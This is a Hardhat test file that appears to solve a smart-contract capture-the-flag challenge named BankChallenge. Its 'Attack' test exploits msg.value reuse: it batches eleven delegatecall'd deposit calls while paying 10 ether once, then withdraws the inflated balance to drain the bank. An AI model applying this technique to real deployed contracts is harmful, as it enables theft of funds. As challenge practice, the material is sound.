import { ethers } from 'hardhat'
import { expect } from 'chai'
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers'
import { BankChallenge, Bank } from '../typechain-types'

const toWei = ethers.utils.parseEther

describe('BankChallenge', async function () {
  let player: SignerWithAddress
  let challenge: BankChallenge

  beforeEach(async function () {
    ;[player] = await ethers.getSigners()

    const Challenge = await ethers.getContractFactory('BankChallenge')
    challenge = (await Challenge.deploy({
      value: toWei('100'),
    })) as BankChallenge
  })

  it('Attack', async function () {
    const bank = (await ethers.getContractFactory('Bank')).attach(
      await challenge.bank()
    ) as Bank

    // we can call deposit multiple times using the batch function
    // and it will reuse the deposit value from msg.value each time
    // the deposit function is called with delegatecall
    const call = bank.interface.encodeFunctionData("deposit")
    await bank.batch(Array(11).fill(call), true, { value: toWei('10')});
    const balance = await bank.balanceOf(player.address);
    await bank.withdraw(balance);

    expect(await challenge.isSolved()).to.be.true
  })
})
